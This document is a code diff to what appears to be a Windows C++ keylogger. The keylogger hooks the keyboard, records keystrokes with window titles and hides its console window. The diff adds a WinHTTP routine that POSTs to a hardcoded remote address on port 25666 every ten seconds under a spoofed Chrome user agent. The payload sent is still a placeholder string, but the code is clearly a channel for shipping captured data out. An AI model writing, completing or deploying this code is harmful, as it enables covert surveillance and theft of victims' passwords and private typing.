@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <shlwapi.h>
+#include <winhttp.h>
 #include <cstdio>
 #include <fstream>
 #include <iostream>
@@ -9,20 +10,9 @@
 // defines which format to use for logging
 // 0 for default, 10 for dec codes, 16 for hex codex
 #define FORMAT 0 
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
-// or you will get problems since every function uses this variable.
 HHOOK _hook;
-
-// This struct contains the data received by the hook callback. As you see in the callback function
-// it contains the thing you will need: vkCode = virtual key code.
 KBDLLHOOKSTRUCT kbdStruct;
-
 std::ofstream out;
-
-void ReleaseHook()
-{
-    UnhookWindowsHookEx(_hook);
-}
 
 int Save(int key_stroke)
 {
@@ -61,7 +51,7 @@ int Save(int key_stroke)
             char s[64];
             strftime(s, sizeof(s), "%Y-%m-%d %H:%M:%S", &tm);
 
-            output << "\n[" << s << ": " << window_title << "]\n\n";
+            output << "\n\n[" << s << ": " << window_title << "]\n";
         }
     }
     int form = FORMAT;
@@ -215,8 +205,6 @@ int Save(int key_stroke)
     return 0;
 }
 
-// This is the callback function. Consider it the event that is raised when, in this case,
-// a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0)
@@ -250,6 +238,11 @@ void SetHook()
     }
 }
 
+void ReleaseHook()
+{
+    UnhookWindowsHookEx(_hook);
+}
+
 void Stealth()
 {
     // set current working directory
@@ -280,15 +273,125 @@ void Stealth()
     }
 }
 
-int main(int argc, char** argv)
+DWORD Push(const std::wstring& ip, int port)
 {
-    // visibility of window
-    Stealth();
+    HINTERNET hSession = INVALID_HANDLE_VALUE;
+    HINTERNET hConnect = INVALID_HANDLE_VALUE;
+    HINTERNET hRequest = INVALID_HANDLE_VALUE;
+    DWORD dwStatusCode = -1;
+    DWORD dwSize = sizeof(dwStatusCode);
+    DWORD dwBytesWritten = 0;
+    std::string body = "This is my body, this is my blood";
 
-    // set the hook
+    hSession = WinHttpOpen(
+        L"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36", // Pretending to be Chrome
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0
+    );
+    if (!hSession)
+    {
+        _RPT1(_CRT_WARN, "WinHttpOpen Error %u\n", GetLastError());
+        goto done;
+    }
+
+    hConnect = WinHttpConnect(
+        hSession, 
+        ip.c_str(), // IP
+        port, // Port
+        0);
+    if (!hConnect)
+    {
+        _RPT1(_CRT_WARN, "WinHttpConnect Error %u\n", GetLastError());
+        goto done;
+    }
+
+    hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"POST", // Verb
+        L"log", // Path
+        NULL,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        0 // http vs https (WINHTTP_FLAG_SECURE)
+    );
+    if (!hRequest)
+    {
+        _RPT1(_CRT_WARN, "WinHttpOpenRequest Error %u\n", GetLastError());
+        goto done;
+    }
+    
+    if (!WinHttpAddRequestHeaders(hRequest, L"Content-Type: text/plain", -1, WINHTTP_ADDREQ_FLAG_ADD))
+    {
+        _RPT1(_CRT_WARN, "WinHttpAddRequestHeaders Error %u\n", GetLastError());
+        goto done;
+    }
+
+    if (!WinHttpSendRequest(
+            hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS, 0, // Additional Headers
+            (LPVOID) body.c_str(), // lpOptional
+            body.size(), // dwOptionalLength
+            body.size(), // dwTotalLength
+            0))
+    {
+        _RPT1(_CRT_WARN, "WinHttpSendRequest Error %u\n", GetLastError());
+        goto done;
+    }
+
+    if (!WinHttpReceiveResponse(hRequest, NULL))
+    {
+        _RPT1(_CRT_WARN, "WinHttpReceiveResponse Error %u\n", GetLastError());
+        goto done;
+    }
+
+    if (!WinHttpQueryHeaders(
+            hRequest,
+            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+            WINHTTP_HEADER_NAME_BY_INDEX,
+            &dwStatusCode,
+            &dwSize,
+            WINHTTP_NO_HEADER_INDEX))
+    {
+        _RPT1(_CRT_WARN, "WinHttpQueryHeaders Error %u\n", GetLastError());
+        goto done;
+    }
+
+done:
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    return dwStatusCode == -1 ? GetLastError() : dwStatusCode;
+}
+
+DWORD WINAPI PushThread(LPVOID lpParam)
+{
+    DWORD dwSleepMs = (DWORD) lpParam;
+    // TODO: IP, Port params
+    const std::wstring ip = L"***REMOVED***";
+    const int port = 25666;
+    
+    while (true)
+    {
+        _RPT0(_CRT_WARN, L"> PushThread\n");
+        auto status = Push(ip, port);
+        _RPT3(_CRT_WARN, "< PushThread = %d\n", status);
+        Sleep(dwSleepMs);
+    }
+}
+
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
+{
+    DWORD dwPushPeriodMs = 10000;
+
+    Stealth();
     SetHook();
 
-    // loop to keep the console application running.
+    DWORD dwThreadId = 0;
+    HANDLE hPushThread = CreateThread(NULL, 0, &PushThread, (LPVOID) dwPushPeriodMs, 0, &dwThreadId);
+
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
     {
